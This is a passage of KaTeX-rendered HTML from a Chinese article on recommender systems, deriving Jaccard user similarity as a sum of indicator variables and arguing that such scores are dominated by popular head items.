style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span><span class="mrel mtight">=</span><span class="mord mtight">1</span></span></span></span><span style="top:-3.2029em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.10903em;">M</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.4358em;"><span/></span></span></span></span></span><span class="mspace" style="margin-right:0.1667em;"/><span class="mord"><span class="mopen nulldelimiter"/><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8451em;"><span style="top:-2.655em;"><span class="pstrut" style="height:3em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"/><span class="frac-line" style="border-bottom-width:0.04em;"/></span><span style="top:-3.394em;"><span class="pstrut" style="height:3em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.4811em;"><span/></span></span></span></span><span class="mclose nulldelimiter"/></span><span class="mclose delimcenter" style="top:0em;"><span class="delimsizing size2">)</span></span></span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:1.354em;"><span style="top:-3.6029em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span></span></span></span></span> 是一个固定的数值</strong>。这表明，<strong>用户相似度分数的计算在数学上极度依赖于少数头部热门物品，而非长尾物品</strong>。</p>
<h4 data-id="heading-2">基于集合相似度的计算</h4>
<p>在推荐系统中，衡量用户 <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>A</mi></mrow><annotation encoding="application/x-tex">A</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"/><span class="mord mathnormal">A</span></span></span></span></span> 和 <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>B</mi></mrow><annotation encoding="application/x-tex">B</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"/><span class="mord mathnormal" style="margin-right:0.05017em;">B</span></span></span></span></span> 相似度最直观的方法是看他们的<strong>重合</strong>度，相似度通常定义为<strong>交集大小与并集大小的比值</strong>。</p>
<div class="math math-display"><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mi>S</mi><mi>i</mi><mi>m</mi><mo stretchy="false">(</mo><mi>A</mi><mo separator="true">,</mo><mi>B</mi><mo stretchy="false">)</mo><mo>=</mo><mfrac><mrow><mi mathvariant="normal">∣</mi><msub><mi mathvariant="script">I</mi><mi>A</mi></msub><mo>∩</mo><msub><mi mathvariant="script">I</mi><mi>B</mi></msub><mi mathvariant="normal">∣</mi></mrow><mrow><mi mathvariant="normal">∣</mi><msub><mi mathvariant="script">I</mi><mi>A</mi></msub><mo>∪</mo><msub><mi mathvariant="script">I</mi><mi>B</mi></msub><mi mathvariant="normal">∣</mi></mrow></mfrac></mrow><annotation encoding="application/x-tex">Sim(A, B) = \frac{|\mathcal{I}_A \cap \mathcal{I}_B|}{|\mathcal{I}_A \cup \mathcal{I}_B|}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"/><span class="mord mathnormal" style="margin-right:0.05764em;">S</span><span class="mord mathnormal">im</span><span class="mopen">(</span><span class="mord mathnormal">A</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"/><span class="mord mathnormal" style="margin-right:0.05017em;">B</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:2.363em;vertical-align:-0.936em;"/><span class="mord"><span class="mopen nulldelimiter"/><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.427em;"><span style="top:-2.314em;"><span class="pstrut" style="height:3em;"/><span class="mord"><span class="mord">∣</span><span class="mord"><span class="mord mathcal" style="margin-right:0.07382em;">I</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3283em;"><span style="top:-2.55em;margin-left:-0.0738em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">A</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"/><span class="mbin">∪</span><span class="mspace" style="margin-right:0.2222em;"/><span class="mord"><span class="mord mathcal" style="margin-right:0.07382em;">I</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3283em;"><span style="top:-2.55em;margin-left:-0.0738em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.05017em;">B</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span><span class="mord">∣</span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"/><span class="frac-line" style="border-bottom-width:0.04em;"/></span><span style="top:-3.677em;"><span class="pstrut" style="height:3em;"/><span class="mord"><span class="mord">∣</span><span class="mord"><span class="mord mathcal" style="margin-right:0.07382em;">I</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3283em;"><span style="top:-2.55em;margin-left:-0.0738em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">A</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"/><span class="mbin">∩</span><span class="mspace" style="margin-right:0.2222em;"/><span class="mord"><span class="mord mathcal" style="margin-right:0.07382em;">I</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3283em;"><span style="top:-2.55em;margin-left:-0.0738em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.05017em;">B</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span><span class="mord">∣</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.936em;"><span/></span></span></span></span><span class="mclose nulldelimiter"/></span></span></span></span></span></div>
<p>假设用户 <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>A</mi></mrow><annotation encoding="application/x-tex">A</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"/><span class="mord mathnormal">A</span></span></span></span></span> 和 <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>B</mi></mrow><annotation encoding="application/x-tex">B</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"/><span class="mord mathnormal" style="margin-right:0.05017em;">B</span></span></span></span></span>，分别拥有 <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>N</mi><mi>A</mi></msub><mo>=</mo><mi mathvariant="normal">∣</mi><msub><mi mathvariant="script">I</mi><mi>A</mi></msub><mi mathvariant="normal">∣</mi></mrow><annotation encoding="application/x-tex">N_A = |\mathcal{I}_A|</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"/><span class="mord"><span class="mord mathnormal" style="margin-right:0.10903em;">N</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3283em;"><span style="top:-2.55em;margin-left:-0.109em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">A</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"/><span class="mord">∣</span><span class="mord"><span class="mord mathcal" style="margin-right:0.07382em;">I</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3283em;"><span style="top:-2.55em;margin-left:-0.0738em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">A</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span><span class="mord">∣</span></span></span></span></span> 和 <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>N</mi><mi>B</mi></msub><mo>=</mo><mi mathvariant="normal">∣</mi><msub><mi mathvariant="script">I</mi><mi>B</mi></msub><mi mathvariant="normal">∣</mi></mrow><annotation encoding="application/x-tex">N_B = |\mathcal{I}_B|</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"/><span class="mord"><span class="mord mathnormal" style="margin-right:0.10903em;">N</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3283em;"><span style="top:-2.55em;margin-left:-0.109em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.05017em;">B</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"/><span class="mord">∣</span><span class="mord"><span class="mord mathcal" style="margin-right:0.07382em;">I</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3283em;"><span style="top:-2.55em;margin-left:-0.0738em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.05017em;">B</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span><span class="mord">∣</span></span></span></span></span> 个评分。假设语料库中有 <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>M</mi></mrow><annotation encoding="application/x-tex">M</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"/><span class="mord mathnormal" style="margin-right:0.10903em;">M</span></span></span></span></span> 个物品 <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">{</mo><msub><mi>V</mi><mn>1</mn></msub><mo separator="true">,</mo><msub><mi>V</mi><mn>2</mn></msub><mo separator="true">,</mo><mo>…</mo><mo separator="true">,</mo><msub><mi>V</mi><mi>M</mi></msub><mo stretchy="false">}</mo></mrow><annotation encoding="application/x-tex">\{V_1, V_2, \dots, V_M\}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"/><span class="mopen">{</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.22222em;">V</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.2222em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"/><span class="mord"><span class="mord mathnormal" style="margin-right:0.22222em;">V</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.2222em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"/><span class="minner">…</span><span class="mspace" style="margin-right:0.1667em;"/><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"/><span class="mord"><span class="mord mathnormal" style="margin-right:0.22222em;">V</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3283em;"><span style="top:-2.55em;margin-left:-0.2222em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.10903em;">M</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span><span class="mclose">}</span></span></span></span></span>。分子部分 <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi mathvariant="normal">∣</mi><msub><mi mathvariant="script">I</mi><mi>A</mi></msub><mo>∩</mo><msub><mi mathvariant="script">I</mi><mi>B</mi></msub><mi mathvariant="normal">∣</mi></mrow><annotation encoding="application/x-tex">|\mathcal{I}_A \cap \mathcal{I}_B|</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"/><span class="mord">∣</span><span class="mord"><span class="mord mathcal" style="margin-right:0.07382em;">I</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3283em;"><span style="top:-2.55em;margin-left:-0.0738em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">A</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"/><span class="mbin">∩</span><span class="mspace" style="margin-right:0.2222em;"/></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"/><span class="mord"><span class="mord mathcal" style="margin-right:0.07382em;">I</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3283em;"><span style="top:-2.55em;margin-left:-0.0738em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.05017em;">B</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span><span class="mord">∣</span></span></span></span></span> 代表<strong>两人共同拥有的物品数</strong>。对于每一个物品 <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>V</mi><mi>i</mi></msub></mrow><annotation encoding="application/x-tex">V_i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"/><span class="mord"><span class="mord mathnormal" style="margin-right:0.22222em;">V</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.2222em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span></span></span></span></span>，我们定义一个指示变量 <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>X</mi><mi>i</mi></msub></mrow><annotation encoding="application/x-tex">X_i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"/><span class="mord"><span class="mord mathnormal" style="margin-right:0.07847em;">X</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0785em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span></span></span></span></span>：</p>
<ul>
<li>如果物品 <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>V</mi><mi>i</mi></msub></mrow><annotation encoding="application/x-tex">V_i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"/><span class="mord"><span class="mord mathnormal" style="margin-right:0.22222em;">V</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.2222em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span></span></span></span></span> 同时出现在用户 A 和用户 B 的评分集中，则 <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>X</mi><mi>i</mi></msub><mo>=</mo><mn>1</mn></mrow><annotation encoding="application/x-tex">X_i = 1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"/><span class="mord"><span class="mord mathnormal" style="margin-right:0.07847em;">X</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0785em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:0.6444em;"/><span class="mord">1</span></span></span></span></span>。</li>
<li>否则，<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>X</mi><mi>i</mi></msub><mo>=</mo><mn>0</mn></mrow><annotation encoding="application/x-tex">X_i = 0</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"/><span class="mord"><span class="mord mathnormal" style="margin-right:0.07847em;">X</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0785em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:0.6444em;"/><span class="mord">0</span></span></span></span></span>。</li>
</ul>
<p>那么，两个用户共同评分的物品总数（即交集的大小）可以表示为所有指示变量的和：</p>
<div class="math math-display"><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mi mathvariant="normal">∣</mi><msub><mi mathvariant="script">I</mi><mi>A</mi></msub><mo>∩</mo><msub><mi mathvariant="script">I</mi><mi>B</mi></msub><mi mathvariant="normal">∣</mi><mo>=</mo><munderover><mo>∑</mo><mrow><mi>i</mi><mo>=</mo><mn>1</mn></mrow><mi>M</mi></munderover><msub><mi>X</mi><mi>i</mi></msub></mrow><annotation encoding="application/x-tex">|\mathcal{I}_A \cap \mathcal{I}_B| = \sum_{i=1}^{M} X_i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"/><span class="mord">∣</span><span class="mord"><span class="mord mathcal" style="margin-right:0.07382em;">I</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3283em;"><span style="top:-2.55em;margin-left:-0.0738em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">A</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"/><span class="mbin">∩</span><span class="mspace" style="margin-right:0.2222em;"/></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"/><span class="mord"><span class="mord mathcal" style="margin-right:0.07382em;">I</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3283em;"><span style="top:-2.55em;margin-left:-0.0738em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.05017em;">B</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span><span class="mord">∣</span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:3.106em;vertical-align:-1.2777em;"/><span class="mop op-limits"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.8283em;"><span style="top:-1.8723em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span><span class="mrel mtight">=</span><span class="mord mtight">1</span></span></span></span><span style="top:-3.05em;"><span class="pstrut" style="height:3.05em;"/><span><span class="mop op-symbol large-op">∑</span></span></span><span style="top:-4.3em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.10903em;">M</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.2777em;"><span/></span></span></span></span><span class="mspace" style="margin-right:0.1667em;"/><span class="mord"><span class="mord mathnormal" style="margin-right:0.07847em;">X</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0785em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span></span></span></span></span></div>
<p>对于第 <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>i</mi></mrow><annotation encoding="application/x-tex">i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6595em;"/><span class="mord mathnormal">i</span></span></span></span></span> 个物品，用户 <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>A</mi></mrow><annotation encoding="application/x-tex">A</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"/><span class="mord mathnormal">A</span></span></span></span></span> 选中的概率是 <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>P</mi><mi>i</mi></msub></mrow><annotation encoding="application/x-tex">P_i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"/><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.1389em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span></span></span></span></span>，用户 <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>B</mi></mrow><annotation encoding="application/x-tex">B</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"/><span class="mord mathnormal" style="margin-right:0.05017em;">B</span></span></span></span></span> 选中的概率也是 <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>P</mi><mi>i</mi></msub></mrow><annotation encoding="application/x-tex">P_i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"/><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.1389em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span></span></span></span></span>。假设两人选电影是<strong>独立行为</strong>，那么<strong>两人同时选中第 <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>i</mi></mrow><annotation encoding="application/x-tex">i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6595em;"/><span class="mord mathnormal">i</span></span></span></span></span> 个物品</strong>的联合概率就是：</p>
<div class="math math-display"><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mi>P</mi><mo stretchy="false">(</mo><mi>A</mi><mtext> and </mtext><mi>B</mi><mtext> chose </mtext><mi>i</mi><mo stretchy="false">)</mo><mo>=</mo><msub><mi>P</mi><mi>i</mi></msub><mo>×</mo><msub><mi>P</mi><mi>i</mi></msub><mo>=</mo><msubsup><mi>P</mi><mi>i</mi><mn>2</mn></msubsup></mrow><annotation encoding="application/x-tex">P(A \text{ and } B \text{ chose } i) = P_i \times P_i = P_i^2</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"/><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="mopen">(</span><span class="mord mathnormal">A</span><span class="mord text"><span class="mord"> and </span></span><span class="mord mathnormal" style="margin-right:0.05017em;">B</span><span class="mord text"><span class="mord"> chose </span></span><span class="mord mathnormal">i</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"/><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.1389em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"/><span class="mbin">×</span><span class="mspace" style="margin-right:0.2222em;"/></span><span class="base"><span class="strut" 